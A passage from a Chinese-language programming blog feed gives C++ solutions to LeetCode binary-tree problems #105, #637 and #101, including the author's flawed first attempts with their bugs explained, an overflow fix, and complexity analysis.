src="/img/LeetCode/105/result.jpeg"></p><div class="note info flat"><p>完整本地測試程式碼可以看 <a href="https://github.com/leozzmc/Leetcode/blob/main/leetcode-105.cpp">我的GitHub</a></p></div><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><p>我看比較好的做法都會是在 <code>buildTree</code> 當中增加一個 <code>map</code> 或者 <code>unorder_map</code> 來增加節點查找速度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTreeHelper</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; preorder, <span class="type">int</span> preStart, <span class="type">int</span> preEnd,</span></span></span><br><span class="line"><span class="params"><span class="function">                              <span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; inorder, <span class="type">int</span> inStart, <span class="type">int</span> inEnd, map &lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp; mp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preStart &gt; preEnd || inStart &gt; inEnd) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> rootVal = preorder[preStart];</span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid = mp[root-&gt;val];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// int mid;</span></span><br><span class="line">        <span class="comment">// for (mid = inStart; mid &lt;= inEnd; mid++) &#123;</span></span><br><span class="line">        <span class="comment">//     if (inorder[mid] == rootVal) &#123;</span></span><br><span class="line">        <span class="comment">//         break;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftTreeSize = mid - inStart;</span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">buildTreeHelper</span>(preorder, preStart + <span class="number">1</span>, preStart + leftTreeSize, inorder, inStart, mid - <span class="number">1</span>, mp);</span><br><span class="line">        root-&gt;right = <span class="built_in">buildTreeHelper</span>(preorder, preStart + leftTreeSize + <span class="number">1</span>, preEnd, inorder, mid + <span class="number">1</span>, inEnd, mp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; preorder, vector&lt;<span class="type">int</span>&gt;&amp; inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preorder.<span class="built_in">empty</span>() || inorder.<span class="built_in">empty</span>() || preorder.<span class="built_in">size</span>() != inorder.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        map &lt;<span class="type">int</span>, <span class="type">int</span>&gt; mp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; inorder.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            mp[inorder[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">buildTreeHelper</span>(preorder, <span class="number">0</span>, preorder.<span class="built_in">size</span>() - <span class="number">1</span>, inorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>() - <span class="number">1</span>, mp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>buildTree</code> 的地方增加宣告一個 <code>map &lt;int, int&gt; mp;</code> 將 <code>inorder</code> 的值還有 index 放入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">map &lt;<span class="type">int</span>, <span class="type">int</span>&gt; mp;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; inorder.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">    mp[inorder[i]] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>buildTreeHelper</code> 參數中多增加一個 <code>map &lt;int, int&gt; &amp; mp</code>， 並且我們在最後呼叫的時候，記得把 <code>mp</code> 傳入參數。</p><p>接著在 <code>buildTreeHelper</code> 函式中找  <code>mid</code> 的時候就可以替換寫成，而不用每次遞迴呼叫函式時都執行一遍for迴圈</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> mid = mp[root-&gt;val];</span><br></pre></td></tr></table></figure><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/105/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>如果是更新前的做法：</p><p><code>buildTreeHelper</code>: $O(n^{2})$</p><ul><li>查找 root 節點，使用 for 循環從 inStart 到 inEnd 查找 rootVal 的位置， <strong>n 為 inorder list 的長度</strong></li><li>遞迴建構左右子樹，每個節點會進行一次 for 循環查找操作，左子樹和右子樹的構建過程均會覆蓋所有節點</li></ul><p>因此，每個節點被訪問一次並執行一個 $O(n)$ 的查找操作，總的時間複雜度為：$O(n^{2})$</p><p><code>buildTree</code>:</p><p>調用 <code>buildTreeHelper</code>，使其主要整體函數複雜度，所以也是 $O(n^{2})$</p><p>但如果是使用 <code>map</code> 後的時間複雜度，由於遞迴呼叫不用每次都執行 for 迴圈查找 root節點，因此 <code>buildTreeHelper</code>時間複雜度降到 $O(n)$<br>，而 <code>buildTree</code> 也是 $O(n)$，因此整體時間複雜度會是  $O(n)$。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>遞迴深度與樹的高度成正比，遞迴深度為 $n$，因此function call stack 空間複雜度為 $O(n)$</li><li>總共創建 $n$ 個節點，因此樹結構本身的空間複雜度為 $O(n)$</li></ul><p>因此整體空間複雜度也會是 $O(n)$</p><p>更新後的空間複雜度會需要額外 $O(n)$　大小的空間，因此整體空間複雜度還會是　$O(n)$</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次一樣卡比較久，一開始卡最久的其實是要怎麼切分左右子樹，這次有參考這個 <a href="https://www.youtube.com/watch?v=ihj4IQGZ2zc&t=21s">YT頻道</a>的講解，講得很清楚。其實感覺也可能需要重新去複習遞迴。另外我對於 <code>map</code> 的使用除了在 Hash Table 的題目外沒有甚麼使用過，感覺也可以整理一篇文章出來。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Medium </tag>
            
            <tag> In-Order Traversal </tag>
            
            <tag> Pre-Order Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元樹各層的平均值 | Easy | LeetCode#637. Average of Levels in Binary Tree</title>
      <link href="/posts/c75ae7a5.html"/>
      <url>/posts/c75ae7a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/637/question1.jpeg"></p><p><img src="/img/LeetCode/637/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目給定一個 Binary Tree 的 <code>root</code>，求各層level 節點值的平均值，結果以陣列回傳</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題與<a href="https://leozzmc.github.io/posts/db053989.html">之前碰過的題目</a>很像，**首先想法一樣會是先BFS (Level-Order Traversal)**。</p><p>如果能夠在各層加入某個變數，在各層結束時加入回傳陣列即可。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>這是我一開始的解法，但這是錯的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">double</span>&gt; result;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        </span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        result.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//cout &lt;&lt; q.front() &lt;&lt; &quot; &quot;;</span></span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> levelSize = q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="type">int</span> avg=<span class="number">0</span>;</span><br><span class="line">            <span class="type">double</span> counter =<span class="number">0</span>;</span><br><span class="line">            TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">//cout &lt;&lt; current-&gt;val &lt;&lt; &quot; &quot;;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; levelSize; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(current-&gt;left != <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">                    avg+=current-&gt;left-&gt;val;</span><br><span class="line">                    counter++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(current-&gt;right != <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">                    avg+=current-&gt;right-&gt;val;</span><br><span class="line">                    counter++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(avg!=<span class="number">0</span>) result.<span class="built_in">push_back</span>((<span class="type">double</span>)(avg/counter));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這超白癡，這個 code在同層有四個child的情況下，它只能兩個兩個child去做平均，這裡其實還沒有活用到 <strong><a href="https://leozzmc.github.io/posts/db053989.html">這篇</a></strong> 所學</p><p>後面改良版本的做法是這樣:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">double</span>&gt; result;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        <span class="type">double</span> counter =<span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> levelSize = q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="type">int</span> avg=<span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; levelSize; i++)&#123;</span><br><span class="line">                TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                avg+=current-&gt;val;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(current-&gt;left != <span class="literal">NULL</span>)q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(current-&gt;right != <span class="literal">NULL</span>)q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(avg!=<span class="number">0</span>) result.<span class="built_in">push_back</span>((<span class="type">double</span>)(avg/(<span class="type">double</span>)levelSize));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但這個程式在我後續 submit 的時候發現了問題，只要題目 input 出現 0，0就不會輸出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input: [0,-1]</span><br><span class="line">output: [-1.00000]</span><br><span class="line">Expect output: [0,-1.00000]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input: [98,97,null,88,null,84,null,79,87,64,null,null,null,63,69,62,null,null,null,30,null,27,59,9,null,null,null,3,null,0,null,-4,null,-16,null,-18,-7,-19,null,null,null,-23,null,-34,null,-42,null,-59,null,-63,null,-64,null,-69,null,-75,null,-81]</span><br></pre></td></tr></table></figure><p><img src="/img/LeetCode/637/error.jpeg"></p><p>因為我手賤加了這個不明所以的判斷，移除前面判斷後即可，但又有一個更大的問題</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(avg!=<span class="number">0</span>) result.<span class="built_in">push_back</span>((<span class="type">double</span>)(avg/(<span class="type">double</span>)levelSize));</span><br></pre></td></tr></table></figure><p>當測資為</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root = [2147483647,2147483647,2147483647]</span><br><span class="line">expect output: [2147483647,2147483647]</span><br></pre></td></tr></table></figure><p><strong>這時候發生 Runtime Error</strong>，這時候我才意識到 <strong>我前面的變數 <code>int avg</code> overflow了</strong>，改成 <code>double</code> 後就解決了。</p><blockquote><p>但這也說明平常解題沒有考慮到 Edge Case，並且也不夠系統性的解決 edge case</p></blockquote><h3 id="程式碼說明"><a href="#程式碼說明" class="headerlink" title="程式碼說明"></a>程式碼說明</h3><ul><li>宣告一個用於儲存回傳陣列用的 vector</li><li>這裡實現 Level-Order Traversal 的方式一樣是用 queue<ul><li>首先將根節點 root 推入 queue <code>q</code></li><li>使用 while 迴圈遍歷每一層，直到 queue 為空</li><li><code>levelSize</code> 儲存當前層的節點數量</li><li>初始化 <code>avg</code> 來累加當前層的節點值</li><li>用一個 for 迴圈存取同一層中的每一個節點</li><li>走到每個節點時，檢查是否有child，如果有就送進queue裡</li><li>每一層結束後，計算平均值，並添加到回傳陣列當中</li></ul></li><li>回傳陣列</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/637/result.jpeg"></p><h2 id="另一種做法-DFS"><a href="#另一種做法-DFS" class="headerlink" title="另一種做法 -  DFS"></a>另一種做法 -  DFS</h2><p>有看到解答區，也有人是透過DFS，然後持續追縱當前深度，並把同一深度的值做加總</p><p><img src="/img/LeetCode/637/dfs.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;pair&lt;<span class="type">double</span>,<span class="type">double</span>&gt;&gt; count;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode* node, <span class="type">int</span> depth)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">double</span> sum = node-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(count.<span class="built_in">size</span>()&lt;=depth)&#123;</span><br><span class="line">            count.<span class="built_in">push_back</span>(&#123;sum, <span class="number">1</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            count[depth].first +=sum;</span><br><span class="line">            count[depth].second++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">dfs</span>(node-&gt;left, depth+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">dfs</span>(node-&gt;right, depth+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        count.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="built_in">dfs</span>(root,<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//iterate through the vector</span></span><br><span class="line">        vector&lt;<span class="type">double</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;count.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(count[i].first/count[i].second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>上面最一開始宣告了一個 <code>vector&lt;pair&lt;double,double&gt;&gt;</code>，第一個元素用來放同一層的節點值加總，第二個元素會是同一層中的節點數量 (用來之後當作平均的分母)</p></li><li><p>接著額外宣告了一個函式 <code>dfs</code>，參數中除了節點指標外還有一個深度 <code>depth</code></p></li><li><p>首先宣告一個sum為當前節點值</p></li><li><p>由於每一層都會是一個pair，因此遞迴呼叫時，一開始count中是不會有該層的，因此我們需要新增一層</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(count.size()&lt;=depth)&#123;</span><br><span class="line">    count.push_back(&#123;sum, 1&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果 <code>count.size() &lt;= depth</code>，就說明 <code>count</code> 中還沒有該層的資料 (剛進入下一層)</p></li><li><p>如果不是剛進入下一層，那就將該層節點值，陸續添加到 <code>count</code> 的第一個元素中，每次都將第二個元素+1 (代表節點數量增加) </p></li><li><p>之後就是遞迴呼叫child，直到沒有節點為止</p></li><li><p>在主函式 <code>averageOfLevels</code>中，呼叫完 <code>dfs</code> 就遍歷 <code>count</code>，依序計算平均，並回傳結果 <code>ans</code></p></li></ul><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/637/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(n)$，其中  n 是樹中節點的數量</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(w)$, w 為樹的寬度，在一般情況下，空間複雜度也可視為 $O(n)$ 因為最寬的一層的節點數可能接近於節點總數的一半 ($O(n&#x2F;2) &#x3D; O(n)$)</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>對於題目的 constraints 要多加留意，並且解題時候需要考慮大數操作 Overflow&#x2F; Underflow 的可能性。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> BFS </tag>
            
            <tag> Level-Order Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>對稱的二元樹 | Easy | LeetCode#101. Symmetric Tree</title>
      <link href="/posts/ac5f27c1.html"/>
      <url>/posts/ac5f27c1.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/101/question1.jpeg"></p><p><img src="/img/LeetCode/101/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個二元樹的 <code>root</code>，題目要我們檢查該二元樹是否是對稱的。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我一開始的想法就錯了，我一開始認為只要 Inorder Traversal 後的結果，只要反向過來也一樣那就是對稱的了</p><p>所以我一開始的解法是錯的:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; result_inorder;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BT::inorder</span><span class="params">(TreeNode* node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(node==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    cout &lt;&lt; node-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    result_inorder.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">    <span class="built_in">inorder</span>(node-&gt;left);</span><br><span class="line">    <span class="built_in">inorder</span>(node-&gt;right);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">BT::isSymmetric</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> result = <span 